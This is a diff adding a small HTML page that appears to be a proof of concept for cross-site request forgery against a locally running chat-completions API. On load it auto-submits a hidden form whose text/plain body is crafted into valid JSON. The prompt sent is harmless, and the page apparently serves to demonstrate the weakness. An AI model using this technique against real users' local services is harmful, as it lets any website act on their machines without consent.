@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <form id="myForm" action="http://localhost:1234/v1/chat/completions" method="POST" enctype="text/plain">
+    <input type="hidden" name='{"model":"google/gemma-4-e4b","messages":[{"role":"user","content":"안녕 너 누구야?"}],"dummy":"' value='\"}' />
+  </form>
+  <script>
+    document.getElementById('myForm').submit();
+  </script>
+</body>
+</html>
